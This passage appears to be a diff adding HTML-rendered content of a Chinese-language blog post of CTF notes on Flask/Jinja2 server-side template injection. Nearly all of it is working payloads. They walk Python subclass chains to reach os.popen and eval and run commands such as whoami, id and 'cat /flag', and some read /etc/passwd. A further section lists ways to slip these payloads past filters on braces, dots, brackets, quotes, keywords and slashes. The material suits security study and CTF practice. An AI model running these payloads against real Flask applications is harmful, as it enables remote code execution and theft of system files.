+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp"># rce&amp;#39;s result could be returned by curling
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp"># class site._Printer
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>&lt;span class="p">{{&lt;/span>&lt;span class="err">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">__class__&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">__mro__&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="nf">__subclasses__&lt;/span>&lt;span class="p">()[&lt;/span>&lt;span class="mi">71&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">__init__&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">__globals__&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="n">os&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="nf">listdir&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sc">&amp;#39;.&amp;#39;&lt;/span>&lt;span class="p">)}}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp"># type &amp;#39;file&amp;#39;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>&lt;span class="p">{{&lt;/span>&lt;span class="err">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">__class__&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">__mro__&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="nf">__subclasses__&lt;/span>&lt;span class="p">()[&lt;/span>&lt;span class="n">xx&lt;/span>&lt;span class="p">](&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">etc&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">passwd&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nf">read&lt;/span>&lt;span class="p">()}}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp"># WarningMessage -&amp;gt; builtins -&amp;gt; file
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>&lt;span class="p">{{&lt;/span>&lt;span class="err">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">__class__&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">__mro__&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="nf">__subclasses__&lt;/span>&lt;span class="p">()[&lt;/span>&lt;span class="mi">59&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">__init__&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">__globals__&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="n">__builtins__&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="n">file&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="p">](&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nl">F&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="c1">//GetFlag.txt&amp;#39;).read()}}
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp"># WarningMessage -&amp;gt; builtins -&amp;gt; eval
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>&lt;span class="p">{{&lt;/span>&lt;span class="err">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">__class__&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">__mro__&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="nf">__subclasses__&lt;/span>&lt;span class="p">()[&lt;/span>&lt;span class="mi">59&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">__init__&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">__globals__&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="n">__builtins__&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="n">eval&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="p">](&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nf">__import__&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;os&amp;#34;&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nf">popen&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;whoami&amp;#34;&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nf">read&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="p">)}}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp"># class &amp;#39;os._wrap_close&amp;#39; -&amp;gt; builtins -&amp;gt; chr 用于绕过
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="o">%&lt;/span> &lt;span class="n">set&lt;/span> &lt;span class="n">chr&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="sc">&amp;#39;[&amp;#39;&lt;/span>&lt;span class="n">_&lt;/span>&lt;span class="err">&amp;#39;&amp;#39;&lt;/span>&lt;span class="n">_cl&lt;/span>&lt;span class="err">&amp;#39;&amp;#39;&lt;/span>&lt;span class="n">ass_&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="sc">&amp;#39;_&amp;#39;&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="sc">&amp;#39;_&amp;#39;&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="n">_ba&lt;/span>&lt;span class="err">&amp;#39;&amp;#39;&lt;/span>&lt;span class="n">se_&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="sc">&amp;#39;_&amp;#39;&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="sc">&amp;#39;_&amp;#39;&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="n">_subcla&lt;/span>&lt;span class="err">&amp;#39;&amp;#39;&lt;/span>&lt;span class="n">sses_&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="sc">&amp;#39;_&amp;#39;&lt;/span>&lt;span class="p">]()[&lt;/span>&lt;span class="mi">137&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="sc">&amp;#39;_&amp;#39;&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="n">_in&lt;/span>&lt;span class="err">&amp;#39;&amp;#39;&lt;/span>&lt;span class="n">it_&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="sc">&amp;#39;_&amp;#39;&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="sc">&amp;#39;_&amp;#39;&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="n">_glo&lt;/span>&lt;span class="err">&amp;#39;&amp;#39;&lt;/span>&lt;span class="n">bals_&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="sc">&amp;#39;_&amp;#39;&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="sc">&amp;#39;_&amp;#39;&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="n">_bui&lt;/span>&lt;span class="err">&amp;#39;&amp;#39;&lt;/span>&lt;span class="n">ltins_&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="sc">&amp;#39;_&amp;#39;&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="n">chr&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>&lt;span class="o">%&lt;/span> &lt;span class="n">set&lt;/span> &lt;span class="n">cmd&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="n">cat&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="o">~&lt;/span>&lt;span class="nf">chr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">47&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">~&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="n">flag&lt;/span>&lt;span class="err">&amp;#39;&lt;/span> &lt;span class="o">%&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp"># class &amp;#39;os._wrap_close&amp;#39; -&amp;gt; popen
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="nf">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="sc">&amp;#39;[&amp;#39;&lt;/span>&lt;span class="n">_&lt;/span>&lt;span class="err">&amp;#39;&amp;#39;&lt;/span>&lt;span class="n">_cl&lt;/span>&lt;span class="err">&amp;#39;&amp;#39;&lt;/span>&lt;span class="n">ass_&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="sc">&amp;#39;_&amp;#39;&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="sc">&amp;#39;_&amp;#39;&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="n">_ba&lt;/span>&lt;span class="err">&amp;#39;&amp;#39;&lt;/span>&lt;span class="n">se_&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="sc">&amp;#39;_&amp;#39;&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="sc">&amp;#39;_&amp;#39;&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="n">_subcla&lt;/span>&lt;span class="err">&amp;#39;&amp;#39;&lt;/span>&lt;span class="n">sses_&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="sc">&amp;#39;_&amp;#39;&lt;/span>&lt;span class="p">]()[&lt;/span>&lt;span class="mi">137&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="sc">&amp;#39;_&amp;#39;&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="n">_in&lt;/span>&lt;span class="err">&amp;#39;&amp;#39;&lt;/span>&lt;span class="n">it_&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="sc">&amp;#39;_&amp;#39;&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="sc">&amp;#39;_&amp;#39;&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="n">_glo&lt;/span>&lt;span class="err">&amp;#39;&amp;#39;&lt;/span>&lt;span class="n">bals_&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="sc">&amp;#39;_&amp;#39;&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="n">po&lt;/span>&lt;span class="err">&amp;#39;&amp;#39;&lt;/span>&lt;span class="n">pen&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="p">](&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="n">pwd&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="p">)[&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="n">rea&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="sc">&amp;#39;d&amp;#39;&lt;/span>&lt;span class="p">]())&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>比如 &lt;code>[xx]&lt;/code> 表示 &lt;code>__subclasses__&lt;/code> 的第xx+1个&lt;/li>
+&lt;li>一般先扫目录找 flag 位置，再读 flag 文件&lt;/li>
+&lt;/ul>
+&lt;p>更自动的payload：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;span class="lnt">8
+&lt;/span>&lt;span class="lnt">9
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="o">{&lt;/span>% &lt;span class="k">for&lt;/span> c in &lt;span class="o">[]&lt;/span>.__class__.__base__.__subclasses__&lt;span class="o">()&lt;/span> %&lt;span class="o">}{&lt;/span>% &lt;span class="k">if&lt;/span> c.__name__&lt;span class="o">==&lt;/span>&lt;span class="s1">&amp;#39;catch_warnings&amp;#39;&lt;/span> %&lt;span class="o">}{{&lt;/span> c.__init__.__globals__&lt;span class="o">[&lt;/span>&lt;span class="s1">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span class="o">]&lt;/span>.eval&lt;span class="o">(&lt;/span>&lt;span class="s2">&amp;#34;__import__(&amp;#39;os&amp;#39;).popen(&amp;#39;cd ..;ls;cat flag&amp;#39;).read()&amp;#34;&lt;/span>&lt;span class="o">)}}{&lt;/span>% endif %&lt;span class="o">}{&lt;/span>% endfor %&lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">{{&lt;/span> config.__class__.__init__.__globals__&lt;span class="o">[&lt;/span>&lt;span class="s1">&amp;#39;os&amp;#39;&lt;/span>&lt;span class="o">]&lt;/span>.popen&lt;span class="o">(&lt;/span>&lt;span class="s1">&amp;#39;cat /flag | base64&amp;#39;&lt;/span>&lt;span class="o">)&lt;/span>.read&lt;span class="o">()}}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># rce&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">{&lt;/span>% &lt;span class="k">for&lt;/span> c in &lt;span class="o">[]&lt;/span>.__class__.__base__.__subclasses__&lt;span class="o">()&lt;/span> %&lt;span class="o">}{&lt;/span>% &lt;span class="k">if&lt;/span> c.__name__&lt;span class="o">==&lt;/span>&lt;span class="s1">&amp;#39;catch_warnings&amp;#39;&lt;/span> %&lt;span class="o">}{{&lt;/span> c.__init__.__globals__&lt;span class="o">[&lt;/span>&lt;span class="s1">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span class="o">]&lt;/span>.eval&lt;span class="o">(&lt;/span>&lt;span class="s2">&amp;#34;__import__(&amp;#39;os&amp;#39;).popen(&amp;#39;id&amp;#39;).read()&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">}}{&lt;/span>% endif %&lt;span class="o">}{&lt;/span>% endfor %&lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># readfile&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">{&lt;/span>% &lt;span class="k">for&lt;/span> c in &lt;span class="o">[]&lt;/span>.__class__.__base__.__subclasses__&lt;span class="o">()&lt;/span> %&lt;span class="o">}{&lt;/span>% &lt;span class="k">if&lt;/span> c.__name__&lt;span class="o">==&lt;/span>&lt;span class="s1">&amp;#39;catch_warnings&amp;#39;&lt;/span> %&lt;span class="o">}{{&lt;/span> c.__init__.__globals__&lt;span class="o">[&lt;/span>&lt;span class="s1">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span class="o">]&lt;/span>.open&lt;span class="o">(&lt;/span>&lt;span class="s1">&amp;#39;filename&amp;#39;&lt;/span>, &lt;span class="s1">&amp;#39;r&amp;#39;&lt;/span>&lt;span class="o">)&lt;/span>.read&lt;span class="o">()}}{&lt;/span>% endif %&lt;span class="o">}{&lt;/span>% endfor %&lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;hr>
+&lt;h2 id="绕过">绕过
+&lt;/h2>&lt;h3 id="-过滤">&lt;code>{{}}&lt;/code> 过滤
+&lt;/h3>&lt;p>{%print 123%}&lt;code>绕过&lt;/code>{}&lt;/p>
+&lt;h3 id="-过滤-1">&lt;code>.&lt;/code> 过滤
+&lt;/h3>&lt;p>使用 JinJa2 函数&lt;code>|attr()&lt;/code>&lt;/p>
+&lt;ul>
+&lt;li>将&lt;code>request.__class__&lt;/code>改成&lt;code>request|attr(&amp;quot;__class__&amp;quot;)&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;p>&lt;code>['']&lt;/code> 绕过&lt;code>.&lt;/code>&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">{{&amp;#34;&amp;#34;.__class__}} = {{&amp;#34;&amp;#34;[&amp;#39;__class&amp;#39;]}}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="-过滤-2">&lt;code>[]&lt;/code> 过滤
+&lt;/h3>&lt;p>pop 函数&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">&amp;#39;&amp;#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&amp;#39;/etc/passwd&amp;#39;).read()
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="-过滤-3">&lt;code>&amp;quot;&lt;/code> 过滤
+&lt;/h3>&lt;p>&lt;code>request.args&lt;/code> 是flask中的一个属性，用 GET path 参数传递路径&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()}}&amp;amp;path=/etc/passwd
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;code>request.args&lt;/code>改为&lt;code>request.values&lt;/code>则利用post的方式进行传参&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">GET:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">{{ &amp;#39;&amp;#39;[request.value.class][request.value.mro][2][request.value.subclasses]()[40](&amp;#39;/etc/passwd&amp;#39;).read() }}
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">POST:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">class=__class__&amp;amp;mro=__mro__&amp;amp;subclasses=__subclasses__
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="关键字过滤">关键字过滤
+&lt;/h3>&lt;p>&lt;code>__getattribute__&lt;/code> base64 编码&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">{{[].__getattribute__(&amp;#39;X19jbGFzc19f&amp;#39;.decode(&amp;#39;base64&amp;#39;)).__base__.__subclasses__()[40](&amp;#34;/etc/passwd&amp;#34;).read()}}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>字符串拼接&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">{{[].__getattribute__(&amp;#39;__c&amp;#39;+&amp;#39;lass__&amp;#39;).__base__.__subclasses__()[40](&amp;#34;/etc/passwd&amp;#34;).read()}}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>关键字中插入一对单引号 &lt;code>''&lt;/code>，绕过对关键字的黑名单过滤&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-Go" data-lang="Go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">BaseCTF&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="sc">&amp;#39;[&amp;#39;&lt;/span>&lt;span class="nx">_&lt;/span>&lt;span class="err">&amp;#39;&amp;#39;&lt;/span>&lt;span class="nx">_cl&lt;/span>&lt;span class="err">&amp;#39;&amp;#39;&lt;/span>&lt;span class="nx">ass_&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="sc">&amp;#39;_&amp;#39;&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="sc">&amp;#39;_&amp;#39;&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nx">_ba&lt;/span>&lt;span class="err">&amp;#39;&amp;#39;&lt;/span>&lt;span class="nx">se_&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="sc">&amp;#39;_&amp;#39;&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="sc">&amp;#39;_&amp;#39;&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nx">_subcla&lt;/span>&lt;span class="err">&amp;#39;&amp;#39;&lt;/span>&lt;span class="nx">sses_&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="sc">&amp;#39;_&amp;#39;&lt;/span>&lt;span class="p">]()[&lt;/span>&lt;span class="mi">137&lt;/span>&lt;span class="p">])&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="-过滤-4">&lt;code>/&lt;/code> 过滤
+&lt;/h3>&lt;p>builtins 的 chr 函数&lt;/p>
+&lt;ul>
+&lt;li>chr(47) 表示 &lt;code>/&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">{% set chr= &amp;#39;&amp;#39;[&amp;#39;_&amp;#39;&amp;#39;_cl&amp;#39;&amp;#39;ass_&amp;#39;&amp;#39;_&amp;#39;][&amp;#39;_&amp;#39;&amp;#39;_ba&amp;#39;&amp;#39;se_&amp;#39;&amp;#39;_&amp;#39;][&amp;#39;_&amp;#39;&amp;#39;_subcla&amp;#39;&amp;#39;sses_&amp;#39;&amp;#39;_&amp;#39;]()[137][&amp;#39;_&amp;#39;&amp;#39;_in&amp;#39;&amp;#39;it_&amp;#39;&amp;#39;_&amp;#39;][&amp;#39;_&amp;#39;&amp;#39;_glo&amp;#39;&amp;#39;bals_&amp;#39;&amp;#39;_&amp;#39;][&amp;#39;_&amp;#39;&amp;#39;_bui&amp;#39;&amp;#39;ltins_&amp;#39;&amp;#39;_&amp;#39;][&amp;#39;chr&amp;#39;]%}
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">{% set cmd=&amp;#39;cat &amp;#39;~chr(47)~&amp;#39;flag&amp;#39; %}
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">{%print(&amp;#39;&amp;#39;[&amp;#39;_&amp;#39;&amp;#39;_cl&amp;#39;&amp;#39;ass_&amp;#39;&amp;#39;_&amp;#39;][&amp;#39;_&amp;#39;&amp;#39;_ba&amp;#39;&amp;#39;se_&amp;#39;&amp;#39;_&amp;#39;][&amp;#39;_&amp;#39;&amp;#39;_subcla&amp;#39;&amp;#39;sses_&amp;#39;&amp;#39;_&amp;#39;]()[137][&amp;#39;_&amp;#39;&amp;#39;_in&amp;#39;&amp;#39;it_&amp;#39;&amp;#39;_&amp;#39;][&amp;#39;_&amp;#39;&amp;#39;_glo&amp;#39;&amp;#39;bals_&amp;#39;&amp;#39;_&amp;#39;][&amp;#39;po&amp;#39;&amp;#39;pen&amp;#39;](cmd)[&amp;#39;rea&amp;#39;&amp;#39;d&amp;#39;]())%}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;hr>
+&lt;h2 id="参考">参考
+&lt;/h2>&lt;ul>
+&lt;li>很清晰且基础的讲解： &lt;a class="link" href="https://www.freebuf.com/column/187845.html" target="_blank" rel="noopener"
+>从零学习flask模板注入 - FreeBuf网络安全行业门户&lt;/a>&lt;/li>
